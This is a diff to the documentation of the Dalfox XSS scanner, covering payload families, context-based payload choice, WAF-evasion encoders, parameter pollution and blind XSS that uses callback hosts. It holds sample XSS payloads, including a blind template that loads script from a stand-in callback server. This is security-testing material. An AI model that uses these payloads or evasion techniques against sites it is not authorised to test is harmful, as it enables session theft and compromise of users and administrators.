@@ -21,7 +21,7 @@ Dalfox composes payloads from several families:
 | **URL protocol** | `javascript:alert(1)` | `href`/`src`-like attributes |
 | **CSP bypass** | `strict-dynamic` script gadgets, nonce reuse, JSONP on allowed hosts | When the response carries a bypassable CSP |
 | **mXSS** | `<foreignobject>`/DOMPurify bypasses | Sanitizer-mutated DOM |
-| **Blind** | `<script src=//callback/></script>` | `--blind` is set |
+| **Blind** | `"'><script src=CALLBACK></script>` | `-b`/`--blind` or `--blind-oob` is set |
 
 Each payload template carries a marker (`class={CLASS}` or `id={ID}`) so the verification stage can positively identify its own element in the DOM.
 
@@ -29,11 +29,11 @@ Each payload template carries a marker (`class={CLASS}` or `id={ID}`) so the ver
 
 During discovery Dalfox classifies each parameter by **injection context**, the place where its reflected value lands:
 
-- HTML body → HTML/attribute-breakout payloads
-- Inside a quoted attribute → attribute-breakout payloads
-- Inside `<script>` → JS-breakout payloads
-- Inside `<style>` → CSS payloads
-- Unknown → fallback mix of HTML + attribute
+- HTML body → HTML tag, mXSS, and DOM-clobbering payloads (wrapped in `-->…<!--` when the value lands inside an HTML comment)
+- Inside a quoted attribute → attribute-breakout and self-triggering event-handler payloads, with URL-protocol payloads first
+- Inside `<script>` → string-delimiter breakouts (`'-alert(1)-'`, `${alert(1)}`, …) and `</script>` tag breakouts
+- Inside `<style>` → `</style>` breakouts followed by an HTML tag
+- Unknown → an interleaved mix of HTML, attribute, mXSS, DOM-clobbering, and URL-protocol payloads
 
 This keeps request counts sane while maximising hit rate.
 
@@ -95,7 +95,7 @@ still reports — no false negatives are introduced.
 Encoders transform the *same payload* into multiple forms so the WAF and server-side filters don't all see the same bytes.
 
 ```bash
-dalfox https://target.app -e url,html,base64
+dalfox scan https://target.app -e url,html,base64
 ```
 
 Available encoders:
@@ -113,30 +113,30 @@ Available encoders:
 | `unicode` | fullwidth mapping |
 | `zwsp` | zero-width space insertion |
 
-Defaults: `url,html`. If you add `none` to the list, Dalfox sends only the raw payloads.
+Defaults: `url,html`. The raw payload is always sent too, so each active encoder adds one variant per base payload (the default sends each payload three ways). If you add `none` to the list, Dalfox sends only the raw payloads.
 
 ## Custom payloads
 
-Provide your own list, one payload per line:
+Provide your own list, one payload per line. Blank lines and lines starting with `#` are skipped:
 
 ```bash
-dalfox https://target.app --custom-payload mypayloads.txt
+dalfox scan https://target.app --custom-payload mypayloads.txt
 ```
 
 Use a custom file instead of the local built-in library:
 
 ```bash
-dalfox https://target.app --custom-payload mypayloads.txt --only-custom-payload
+dalfox scan https://target.app --custom-payload mypayloads.txt --only-custom-payload
 ```
 
-The custom file supplies the local reflection and DOM base payloads. Adaptive synthesis and shared CSP/technology payloads are skipped. Encoders and WAF mutations still produce variants of custom entries, and explicitly requested `--remote-payloads` remain active.
+`--only-custom-payload` without `--custom-payload` is rejected, as is a file with no usable lines. The custom file supplies the local reflection and DOM base payloads. Adaptive synthesis and shared CSP/technology payloads are skipped. Encoders and WAF mutations still produce variants of custom entries, and explicitly requested `--remote-payloads` remain active.
 
 ## Remote payload sources
 
 Pull community wordlists on demand:
 
 ```bash
-dalfox https://target.app --remote-payloads portswigger,payloadbox
+dalfox scan https://target.app --remote-payloads portswigger,payloadbox
 ```
 
 Supported sources: `portswigger`, `payloadbox`. Fetched once per run, respecting `--proxy` and `--timeout`.
@@ -183,6 +183,8 @@ dalfox payload functions | grep -i prompt
 dalfox payload special-chars | wc -l
 ```
 
+Add `--json` to get a JSON array instead (`dalfox payload all --json` flattens every local group into one array; `dalfox payload --json` with no selector prints the per-selector counts).
+
 The `special-chars` group is handy for manual reflection testing — inject each byte on
 its own to see which characters survive verbatim, which come back HTML/URL-encoded, and
 which are stripped. `functions` and `awesome-alert` are curated to *visibly* fire (and to
@@ -193,7 +195,7 @@ render the host/origin), so a single screenshot proves impact.
 The classic `alert(1)` can be loud. Swap it out so you can prove impact without popping dialogs everywhere:
 
 ```bash
-dalfox https://target.app \
+dalfox scan https://target.app \
   --custom-alert-value "document.domain" \
   --custom-alert-type str
 ```
@@ -206,32 +208,36 @@ dalfox https://target.app \
 Blind XSS fires later, in a context you can't see (an admin panel, a support agent's dashboard). You need an out-of-band listener:
 
 ```bash
-dalfox https://target.app -b https://your-callback.interact.sh
+dalfox scan https://target.app -b https://your-callback.interact.sh
 ```
 
 Custom blind templates:
 
 ```bash
-dalfox https://target.app \
+dalfox scan https://target.app \
   -b https://your-callback.example \
   --custom-blind-xss-payload blind-templates.txt
-# each line may contain {} (replaced with the callback URL)
+# each line must contain {callback} (replaced with the callback URL)
 ```
+
+Only lines containing `{callback}` are used; other lines are skipped with a warning, and `#` comments and blank lines are ignored. A literal `{}` is left alone, so a template can carry JavaScript like `()=>{}`. That also means the `{}` skeletons printed by `dalfox payload blind` need `{}` changed to `{callback}` before you use them here. If no line is usable, Dalfox falls back to the built-in templates.
+
+Without a callback server of your own, `--blind-oob` registers with interactsh and polls for the callback itself; see [Quick Start](../../getting-started/quick-start/).
 
 ## HTTP Parameter Pollution (HPP)
 
 Some filters only inspect the *first* occurrence of a parameter. Dalfox can duplicate parameters to slip a payload into the second slot:
 
 ```bash
-dalfox https://target.app --hpp
+dalfox scan https://target.app --hpp
 ```
 
 ## Deep scan
 
-By default Dalfox stops testing a parameter once it finds a verified payload. `--deep-scan` keeps going:
+By default Dalfox stops testing a parameter once it finds a verified payload. `--deep-scan` keeps going, and also lifts the built-in cap of 3000 base payloads per parameter (see `--max-payloads-per-param` in the [CLI reference](../../reference/cli/)):
 
 ```bash
-dalfox https://target.app --deep-scan
+dalfox scan https://target.app --deep-scan
 ```
 
 Useful for research; slower for production pipelines.
